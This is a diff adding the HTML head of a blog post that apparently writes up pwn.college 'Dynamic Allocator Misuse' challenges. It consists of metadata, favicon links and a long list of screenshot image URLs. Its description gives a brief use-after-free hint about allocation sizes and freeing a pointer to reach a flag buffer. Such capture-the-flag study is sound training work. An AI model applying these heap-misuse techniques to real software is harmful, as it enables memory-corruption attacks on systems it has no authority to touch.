@@ -1,0 +1,1751 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="shark">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Welcome to backDynamic Allocator MisuseUse After FreeFreebie (Easy)all right   read_flag&#x3D;malloc(292) flag will be read in flag_buffer bin #17&#x3D;281 - 296 we can malloc 293 and free   the *ptr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn.college-pro sec-_Dynamic Allocator Misuse">
+<meta property="og:url" content="https://ghostshark-pro.github.io/2026/04/23/pwn.college-pro%20sec-_Dynamic%20Allocator%20Misuse/index.html">
+<meta property="og:site_name" content="shark&#39;s home">
+<meta property="og:description" content="Welcome to backDynamic Allocator MisuseUse After FreeFreebie (Easy)all right   read_flag&#x3D;malloc(292) flag will be read in flag_buffer bin #17&#x3D;281 - 296 we can malloc 293 and free   the *ptr">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770707942231-e0a84614-1d0f-4317-b757-569f33f58638.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770708253195-85bf3ad5-a37f-4bd9-aabf-f66e1679bef1.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770708495010-ab36f1fc-207c-45d8-8379-f83b58569bd4.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770709848832-52be86b6-2531-44b0-aab5-9bd08fb8855c.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770709908469-0342a951-761d-4b0b-97e9-b040ca6fd0e2.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770710072433-73839255-07fd-42c4-960f-c62d750909f5.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770710149339-4a3587d2-0e79-4c13-b5fc-c7420fe8fa43.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770711082202-b154e8a2-7f04-4819-9a80-6dfd58398a0d.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770713040668-c08da4b9-25b7-49d2-afb7-8301c96282fa.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770713088998-3ea2701d-5bea-4f59-be37-10c52dd8206b.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770713415709-5c1ad8d5-c55c-4f8e-a508-3ae9eadc1843.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770714016268-c040a754-a15d-4228-88ad-695f139909cd.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770715049019-68c89af3-716e-413b-9355-64a4c666f980.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770715748044-99be4d10-1e0c-47ab-934d-588524712836.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770715819460-cbd58aee-e284-40b9-97e2-7b469d789646.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770728485239-f65bc2ab-dedd-4238-9496-99e73e56b3c9.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770731209445-812ba97e-1787-4808-a9a5-b2e88c43c604.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770731237205-ee729903-717e-411b-8b23-54ba892b706a.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770731473153-f00ea2c2-78ac-4bb7-8508-e84507c8a20c.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770731547644-b4b6aa3a-7d34-4734-9a05-4946ef789ebb.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770993388116-3c5b993b-61ba-4031-b882-5b7125ccb784.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770993473506-dbcaa5bd-609d-4c7d-b206-c0b23aeefb7b.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770995429198-c2dfb702-9ccd-48c8-8428-1106c719fa18.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770995802757-d28752b8-74c8-471c-a2ce-af03919c62f8.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770997913457-755bbed1-f838-4c6b-b82a-24eed3fe09d9.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770999264658-68111ad2-dc28-4701-8338-d79d58ae2d5a.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770999513629-def5c7b9-86e9-475b-8355-9a307a7fdc28.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1770999720304-d5e7f610-13b5-405b-98d9-5943f541a88f.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771088304809-4cec6943-da7a-44e2-9787-5da1a0403377.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771088574473-8dc1773c-ac58-4b10-8228-b0c7885ed70d.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771088797323-464eff7d-98d2-4068-81a8-7456ab33e912.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771092310344-9e4f017f-77a0-45e4-a99c-c7f692b5d7c1.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771092322071-7cd4fa70-beb4-43e7-91e4-1a4249795eac.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771092350765-6497fe1d-725e-4a0a-a37b-25547973a873.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771092486146-aceae88b-f3bb-4037-ad8d-7de753aba093.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771092711495-d91f15fa-de96-42f0-b1d8-e026c0eb9b1d.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771094324179-5a8be338-0480-4307-8383-11fc5ab5da31.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771094500923-c72faac5-3954-44f1-bf63-cc8557b56db3.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771094852736-d1f56ff0-108e-4424-8554-6d72986bfa22.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771097729328-f3ab73d2-9987-49ee-a641-657940b92760.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771097753642-ec090be4-e9a6-4e22-9f7d-2a62b4a2a034.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771097847239-afc7a736-15d0-4a60-a4da-d8d90f6978e5.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771098225042-1ac046aa-f6b4-456c-99ca-fc2af0a01b0d.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771098389203-ed2ede65-2d36-454e-8e0a-169013e4e699.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771098743309-7e35aad9-ac34-4c96-a184-caf4732e61fa.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771136495136-0a93bbf6-ee79-47ee-87a7-af5710c9d0ba.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771136628346-5e451016-a9e0-4dcf-b69d-1970dec5cf91.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771139681270-500c6999-6a7b-40e5-a64a-afe8380bdd33.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771139872376-a1566744-834e-490a-923b-240b1cb8ff47.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771139974679-ed627388-ec86-49ba-8b69-918909f3e5a1.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771140175686-ed5d9d43-3a91-485d-bd73-e4f40cfe81be.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771141165851-77bfad7b-88c0-4df5-98f1-6457ad4f7e38.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771141263624-a2d0c43c-6fdd-490e-ab1e-32dc59303727.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771141281070-7035a77e-a4cc-4edd-897b-a41b918943a3.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771141336349-7dfb7738-e483-4bef-9dd5-fea46529cad5.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771177234030-f89975ec-ba61-4fdf-8d4d-fa61f3339c6d.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771223163569-78acad55-435b-4ceb-a59e-9f4195321bf7.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771223400663-0d040c9d-f8b8-49e3-b49e-88293e1d5e72.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771335889870-11a53115-bf02-47e6-bf08-417742989192.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771339682352-3185c699-f97c-4ada-8cec-7ec2b1e3e1e3.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771339129209-34143924-2339-40c0-9a27-93e684c038c3.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771342587113-6c910a4d-c274-4bf4-a557-6fec42c3d010.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771347064267-d75260fc-0677-489f-aeb3-1f2cacef2b62.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771349689695-d162dfe4-4a51-4217-ba2b-7e9918d27293.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771349768244-2d203e37-5711-40fc-8ef0-e1c4f63d79af.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771349985737-4684fae5-826d-4616-b6e1-c4c585eb3b88.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771351066125-c5b8594c-3290-49e2-bf3e-db6f4d4a6e2b.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771353732314-7bc460ce-1873-4493-b122-8cf4cf8ece91.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771353881491-9d028d54-94b6-4088-98ea-7a74c8107348.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771353909616-641796c5-6bf4-4cbb-a538-0805bb4c1473.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771354006529-138ac471-c356-414f-b190-55f437f2effe.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771422460018-c81e2b37-2052-4c7d-afe4-be73e74e60f6.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771422743893-83a9fb6a-d5f5-4802-a38d-2c1b8751dd3e.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771429138503-9631b621-887c-41de-8466-61caebd6629a.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771429679767-3512a775-c5fb-46b2-a787-23f73cc6c00a.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771430189787-d7982ab5-8131-4be5-be7c-0acbf66e7ef2.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771430378683-ac0e1619-2490-41bf-b35a-573bc651e803.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771512884812-7b6f86ef-7e48-498e-a304-bfe7135f2fc7.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771516404354-92bb7ac8-6c9a-47bc-a16b-9be09e5f7719.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771516641907-2ffadfd0-04eb-489f-b702-3364819dc4c5.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771516842440-2b115f15-f6bd-4305-b3aa-78685abf312c.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771517057899-5808e5c0-b120-4d6d-b382-ca3c55acc94e.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771517993216-303389cd-226c-4bcd-ad7c-aaefa58b111c.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771518143120-b852bda3-d8d8-49fd-be71-dbbe574c8d06.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771520253380-f020c11d-ecc2-415c-ac6d-6b388e89afd9.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771520347796-9c1aabee-faa7-4fbd-a71f-716fabce83d8.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771520722570-9ae1cf9c-23fb-4de4-a9e8-a10941faf819.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771522404213-8fe3e304-55b9-470d-af3a-f6753ad0ec99.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771523606537-38325a9c-9408-45ef-9622-787e2085f973.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771572562365-c2c624e6-866d-44b6-9298-a176ab51dc26.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771572576725-7d128754-cb37-4459-ac3f-584991e58492.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771573494154-005b5cc8-7d0b-44a7-b4fd-5b3e9f57fc2b.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771581175591-c49aa824-46b9-4774-8a81-6dc903ba90c5.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771583092174-3f1feab6-36a5-4be5-9363-9bacd8c48927.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771583169920-b1e42e47-73cc-40f5-9a1a-621ee8845da1.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771583307802-84a526f3-5f90-46a8-ade3-aedc4f49debb.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771593750750-3bb1e7ec-95d0-4a3b-b55a-ce9bc7f739a4.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771593901452-e3276ed5-45b3-4da5-9562-1978b85d97fd.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771596066191-20c868a5-a51b-4ef1-b8a9-63032a0ee8cf.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771727137521-d4531d57-a7d3-4591-9dee-21b428a81526.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771727203486-516df83c-e12d-4a4e-ac92-b4971c1f0914.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771727385621-746f4f61-85bc-4509-b82f-a72ca37cdb9d.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771727489034-2a8181c9-9c20-43db-bf22-7d58d1a437de.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771737626276-fd39f724-2459-47c2-b1eb-417946a94e44.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771737751704-5da91911-ba9e-4eaa-ab32-821aa76b5770.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771737843503-107412a3-be25-4d89-af6a-73ae4eaa309c.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771737899483-01f4334b-941b-4e5d-93b2-84c67741a5e1.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1771737974364-2f57472a-0e19-4b07-94cd-8fe9f0df1d55.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772109169281-8c102cd5-7ad4-4db5-9dc6-6a854fba7bd4.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772073572970-6256c7d0-df3f-4e99-8b99-047650a8204d.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772081162845-f8cac0ae-6391-4f30-89f6-b8a22d5de39f.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772084802454-7ebc23b6-7be8-45a8-b018-439cc005cabc.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772091687615-efaed352-d701-4339-a497-dd31cd4c893f.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772093213954-b1d68bbc-79f6-487f-a0a7-07cce2fe11bb.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772110932509-9860aa21-fc51-473f-b05e-3b16e0fd06ba.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772111060827-2742cd36-8396-481d-bc90-91f9b9338fce.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772111613590-df5ba62b-d364-41cc-bcf3-f181a822e9b7.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772111831385-c23eaf44-a070-4bde-aba2-0495518ab5dd.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772123348758-6590975e-e909-46d4-b20d-9f90b7751147.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772264578297-927d665b-d3d0-448a-b7ad-312dfaf6b718.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772264602400-505c3665-6581-4bb1-afe1-f61536789b44.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772265798108-a49b2cd3-e9e7-4c28-98d2-25b7c230bc56.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772269181581-94e49327-5797-4ee0-bf9d-3a00827309c9.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772269648675-5b9bbcdc-6e1c-48b1-8c34-f4d83ed6e1ec.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772269736796-f73c7e86-a2f2-4034-94f7-31cac9cb0b3a.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772272847667-c26caf4f-7234-4a50-86ec-e5b515da6e8c.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772273470743-07a95157-5775-459b-8a1f-6883395daa2a.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772273579884-5bfa10b3-b5e4-4cee-81e6-635d311a8007.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772273640352-58d43460-4292-4f7a-9749-3595c254cf8c.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772273751065-2b25da78-8a43-488e-80b5-b2865d0e1483.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772274104072-f2e53f60-5a06-4b7f-80b0-5ed123e0ce12.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772274258496-80eae9ea-f542-4372-b39f-cd039beeb826.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772274277598-3f1b5949-6a0f-466b-aa81-caadd95c4dd9.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772274301902-6b190856-20d6-4b84-9526-06023c0367fa.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772274332304-cfbc830b-66d0-475c-93b5-66ff578b2a58.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772274387422-cf663834-7554-414d-a5c9-7ca03b5da9e1.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772274591606-84a2fa98-8862-4998-a2d3-62dc83fa54b0.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772332992498-b3d95bba-5ea0-4809-83ef-929cc09c1141.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772333071250-605812c0-c5b6-4831-98d9-6fbce3bf91de.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772333542270-02a61a07-631f-48d7-9fdb-f480a9e980db.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772337125963-7d306b1e-2f85-4a87-b948-06ad440424fe.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772337152764-53162b33-d8ec-4eb8-8763-f1b330067da7.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772337414754-1c6e24d9-e935-456d-94cd-ba9f1f77ce29.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772337663369-85cdd9ba-f6d9-4b29-96ff-a523f3fcda67.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772339422188-a3c9c0d7-9fe8-40b2-be0a-95f97bda1b30.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772339433538-b76f859d-f21c-4f13-b8ac-83fdc98e2ed8.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772354143983-8a989c96-1274-464a-a9ca-e9e8564d13f9.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772354180635-08a917f3-162b-4114-9c4e-6824e221e9d4.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772358065522-020892d2-aff2-4906-b690-ef82dd5c6f62.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772358110358-de41d021-9efa-4a1c-a33f-b9802683b597.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772358573755-f6e07d51-2dc2-4b34-b21d-cb4554a636da.png">
+<meta property="og:image" content="https://ghostshark-pro.github.io/images/pwn.college-pro-sec-_Dynamic-Allocator-Misuse/1772358672719-9d7a63d7-a436-4bb2-916a-84339b8f82f1.png">
